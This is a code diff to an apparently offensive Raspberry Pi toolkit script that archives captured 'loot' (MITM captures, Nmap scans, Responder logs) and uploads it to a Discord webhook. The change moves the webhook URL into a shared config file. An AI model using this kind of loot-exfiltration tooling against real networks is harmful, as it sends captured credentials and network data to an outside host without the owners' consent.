@@ -49,7 +49,23 @@ MITM_DIR       = LOOT_DIR / "MITM"
 NMAP_DIR       = LOOT_DIR / "Nmap"
 RESPONDER_DIR  = Path("/root/Raspyjack/Responder") / "logs"
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/xxxxxxxxxxxxxxxx/YYYYYYYYYYYYY" #<- EDIT ME!
+WEBHOOK_FILE = Path("/root/Raspyjack/discord_webhook.txt")
+
+
+def _load_webhook_url():
+    """Load webhook URL from system config (shared with raspyjack.py)."""
+    try:
+        if WEBHOOK_FILE.exists():
+            for line in WEBHOOK_FILE.read_text().splitlines():
+                line = line.strip()
+                if line.startswith("https://discord.com/api/webhooks/"):
+                    return line
+    except Exception:
+        pass
+    return ""
+
+
+WEBHOOK_URL = _load_webhook_url()
 
 # Discord’s hard attachment cap (bytes) – 8 MiB for free users.
 DISCORD_SIZE_LIMIT = 8 * 1024 * 1024
@@ -133,10 +149,11 @@ def send_to_discord(archive: io.BytesIO) -> None:
 # 7) Main routine
 # ---------------------------------------------------------------------------
 def main() -> None:
-    if "discord.com/api/webhooks/xxxxxxxx" in WEBHOOK_URL:
+    if not WEBHOOK_URL or "xxxxxxxx" in WEBHOOK_URL:
         print(textwrap.dedent("""\
-            [ERROR] You forgot to set your own webhook URL!
-            Edit WEBHOOK_URL near the top of this script."""))
+            [ERROR] No Discord webhook configured!
+            Add your webhook URL to /root/Raspyjack/discord_webhook.txt
+            (same file used by RaspyJack main menu)."""))
         sys.exit(1)
 
     print("[INFO] Building archive …", end=" ")
